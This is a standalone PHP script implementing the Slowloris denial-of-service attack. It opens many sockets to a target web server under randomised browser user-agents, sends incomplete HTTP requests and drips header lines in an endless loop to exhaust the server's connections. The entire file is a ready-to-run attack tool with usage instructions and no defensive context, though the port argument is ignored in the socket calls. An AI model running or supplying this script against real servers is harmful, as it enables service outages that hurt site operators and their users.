<?php

const USER_AGENTS = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
];

$hostname    = $argv[1] ?? null;
$port        = $argv[2] ?? null;
$socketCount = $argv[3] ?? 150;
$timeout     = $argv[4] ?? 10;

if (!$hostname || !$port) {
    echo 'usage: php slowloris.php hostname port [socketCount] [timeout]' . PHP_EOL;
    die;
}

if (!is_numeric($port)) {
    echo 'Port must be numeric' . PHP_EOL;
    die;
}

if (!is_numeric($socketCount)) {
    echo 'Socket count must be numeric' . PHP_EOL;
    die;
}

if (!is_numeric($timeout)) {
    echo 'Timeout must be numeric' . PHP_EOL;
    die;
}

function getRandomUserAgent(): string
{
    return USER_AGENTS[\array_rand(USER_AGENTS)];
}

/**
 * @param string   $hostname
 * @param int|null $port
 *
 * @return false|resource
 */
function initSocket(string $hostname, ?int $port = 80)
{
    $socket = \socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    \socket_connect($socket, \gethostbyname($hostname), $port);

    $userAgent = getRandomUserAgent();
    $message   = "GET / HTTP/1.1\r\n";
    $message .= "Host: $hostname\r\n";
    $message .= "User-Agent: $userAgent\r\n";
    $message .= "Accept-Language: en-US,en,q=0.5\r\n";

    \socket_write($socket, $message, \strlen($message));

    return $socket;
}

$listOfSockets = [];
while (true) {
    $activeCount = ($socketCount - \count($listOfSockets));

    echo 'Building sockets...' . PHP_EOL;

    for ($i = 0; $i < $activeCount; $i++) {
        $socket = initSocket($hostname);

        $listOfSockets[] = $socket;
    }

    $packetCount = 0;

    echo 'Sending data...' . PHP_EOL;

    foreach ($listOfSockets as $key => $socket) {
        $message = \sprintf("X-a: %s\r\n", \random_int(1, 5000));

        if (@\socket_write($socket, $message, \strlen($message)) === false) {
            unset($listOfSockets[$key]);
            \socket_close($socket);
        } else {
            $packetCount++;
        }
    }

    echo "$packetCount packets sent successfully. Thread now sleeping for $timeout seconds..." . PHP_EOL;

    \sleep($timeout);
}


